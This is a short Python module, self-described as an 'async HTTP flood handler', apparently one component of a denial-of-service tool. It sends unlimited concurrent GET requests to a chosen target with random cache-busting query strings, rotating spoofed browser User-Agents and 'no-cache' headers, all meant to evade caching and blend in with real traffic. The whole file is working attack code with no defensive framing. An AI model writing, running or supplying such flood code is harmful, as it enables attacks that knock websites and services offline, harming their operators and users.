"""Async HTTP flood handler. Uses aiohttp with connection reuse."""
from __future__ import annotations

import aiohttp

_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/126.0",
]


class HttpHandler:
    def __init__(self, session: aiohttp.ClientSession | None = None) -> None:
        self._session = session
        self._owns_session = session is None

    async def open(self) -> None:
        if self._session is None:
            connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
            self._session = aiohttp.ClientSession(connector=connector)

    async def send(self, target: str, port: int) -> tuple[int, int]:
        if self._session is None:
            await self.open()
        scheme = "https" if port == 443 else "http"
        url = f"{scheme}://{target}:{port}/?{__import__('random').randint(0, 10**9)}"
        headers = {"User-Agent": __import__("random").choice(_USER_AGENTS),
                   "Cache-Control": "no-cache"}
        try:
            async with self._session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=3)) as r:  # type: ignore[union-attr]
                body = await r.read()
                return 1, len(body)
        except (aiohttp.ClientError, TimeoutError):
            return 0, 0

    async def close(self) -> None:
        if self._owns_session and self._session is not None:
            await self._session.close()
            self._session = None